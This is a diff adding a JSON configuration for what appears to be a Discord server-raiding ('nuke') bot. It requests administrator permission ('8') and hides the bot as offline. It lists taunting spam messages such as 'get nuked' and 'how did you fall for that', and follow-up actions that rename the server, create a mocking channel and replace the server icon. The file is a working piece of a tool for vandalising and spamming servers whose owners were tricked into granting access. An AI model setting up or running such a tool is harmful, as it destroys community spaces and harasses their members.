@@ -1,0 +1,30 @@
+{
+    "token": "TOKEN HERE",
+    "permissions": [
+        "YOUR ID"
+    ],
+    "bomb_messages": {
+        "random": 10,
+        "fixed": [
+            "zzzzzz",
+            "get rekt kid",
+            "hahaha",
+            "ezzzzz",
+            "ez pz",
+            "LMAO",
+            "get nuked",
+            "how did you fall for that",
+            "LOL"
+        ]
+    },
+    "bot_permission": "8",
+    "command_prefix": "!",
+    "bot_status": "offline",
+    "verbose": 15,
+    "after": [
+        "aCat ruins of ur shit server",
+        "aChannel hahaha-gotem",
+        "sn nuked",
+        "si https://ih1.redbubble.net/image.788111706.5520/st,small,507x507-pad,600x600,f8f8f8.u2.jpg"
+    ]
+}
